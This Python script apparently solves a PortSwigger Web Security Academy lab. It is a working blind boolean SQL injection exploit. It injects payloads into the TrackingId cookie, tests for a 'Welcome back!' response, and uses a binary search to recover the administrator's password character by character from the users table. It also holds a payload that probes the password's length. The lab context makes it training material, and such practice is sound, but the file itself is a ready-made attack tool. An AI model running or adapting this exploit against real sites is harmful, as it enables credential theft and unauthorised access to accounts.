import string
import requests

# proxies: https://www.th3r3p0.com/random/python-requests-and-burp-suite.html
# openssl x509 -inform DER -outform PEM -in example.der -out example.pem
# export REQUESTS_CA_BUNDLE="./cacert.pem" # use set instead of export for windows.
# export HTTP_PROXY="http://127.0.0.1:8080"
# export HTTPS_PROXY="http://127.0.0.1:8080"

header_data = {}
url = "https://0a8500c703247e2680a4a8bf00760079.web-security-academy.net/"


def send_request(payload):
    headers_data = {
        "Cookie": "TrackingId=yTrzMwSdroLDncEW"
        + payload
        + "; session=LYtBXnZre4HGecn5Oj0QiR7YlaOWjGRq"
    }
    # headers_data.update(header_data)
    try:
        response = requests.get(url, headers=headers_data | header_data)

        # Check if the request was successful (status code 200)
        if response.status_code == 200:
            server_response = response.text
            # print(server_response)
            if "Welcome back!" in server_response:
                return True
            else:
                return False
        else:
            print(
                f"Raw HTTP GET request failed with status code: {response.status_code}"
            )
    except requests.exceptions.RequestException as e:
        print(f"An error occurred: {e}")


def guess_character(count):
    possible_characters = sorted(
        list(
            string.ascii_letters
            + string.digits
            # + string.punctuation
        )
    )
    while len(possible_characters) > 1:
        midpoint = len(possible_characters) // 2
        guess = possible_characters[midpoint]
        # payload = f"'+AND+SUBSTRING((SELECT+version()),{count},1)<{guess}'"
        payload = f"'+AND+(SELECT+SUBSTRING(password,{count},1)+FROM+users+WHERE+username%3d'administrator')<'{guess}"
        user_response = send_request(payload)

        if user_response:
            possible_characters = possible_characters[:midpoint]
        else:
            payload = f"'+AND+(SELECT+SUBSTRING(password,{count},1)+FROM+users+WHERE+username%3d'administrator')%3d'{guess}"
            if send_request(payload):
                return guess
            possible_characters = possible_characters[midpoint + 1 :]
    return possible_characters[0]


def get_output(val):
    for i in range(val):
        print(guess_character(i + 1), end="", flush=True)
    print()


def set_headers():
    global header_data
    http_request = """
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Windows"
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: cross-site
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://portswigger.net/
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-US,en;q=0.9
    """
    for line in http_request.strip().split("\n"):
        key, value = line.split(":", 1)
        header_data[key.strip()] = value.strip()


def get_pass_length():
    for i in range(10, 30):
        payload = f"'+and+(select+'a'+from+users+where+username%3d'administrator'+and+length(password)%3d{i})%3d'a"
        if send_request(payload):
            return i


def main():
    set_headers()
    print("is it working: ", send_request(""))
    pass_length = get_pass_length
    print(pass_length)
    # payload to check the length of chars:
    # payload = '+and+(select+'a'+from+users+where+username%3d'administrator'+and+length(password)%3d{count})%3d'a
    get_output(20)


if __name__ == "__main__":
    main()
